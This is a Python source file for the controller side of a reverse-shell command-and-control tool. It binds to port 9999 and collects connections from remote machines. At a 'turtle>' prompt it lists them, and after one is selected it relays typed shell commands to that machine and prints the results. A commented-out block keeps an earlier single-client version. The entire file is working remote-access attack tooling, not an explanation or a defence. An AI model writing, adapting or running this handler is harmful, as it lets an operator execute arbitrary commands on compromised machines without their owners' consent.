import sys
import socket
import time
from queue import Queue
from threading import Thread

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []

def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

def socket_bind():
    try:
        global host
        global port
        global s
        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        socket_bind()

def socket_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while True:
        try:
            conn, address = s.accept()
            conn.setblocking(1)
            print("Connection has been established " + str(address))
            all_connections.append(conn)
            all_addresses.append(address)
        except:
            print("Error accepting connections")

def start_turtle():
    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()
            continue
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not recognized")

def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(10240)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += str(i) + '   '  + str(all_addresses[i][0]) + '   ' + str(all_addresses[i][1]) + '\n'
    print('----- Clients -----' + '\n' + results)

def get_target(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to " + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + '> ', end="")
        return conn
    except:
        print("Not a valid selection")
        return None

def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20489), "utf-8")
                print(client_response, end="")
            if cmd =='quit':
                break
        except:
            print("Connection was lost")
            break

def worker_thread():
    for _ in range(NUMBER_OF_THREADS):
        t = Thread(target=work)
        t.setDaemon = True
        t.start()

def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            socket_connections()
        if x == 2:
            start_turtle()
        queue.task_done()

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()
'''
def socket_accept():
    try:
        global s
        conn, address = s.accept()
        print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
        send_commands(conn)
    except socket.error as ex:
        print(str(ex))
    conn.close()

def  send_commands(conn):
    while True:
        cmd = input()
        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")
'''
def main():
    worker_thread()
    create_jobs()

if __name__ == '__main__':
    main()
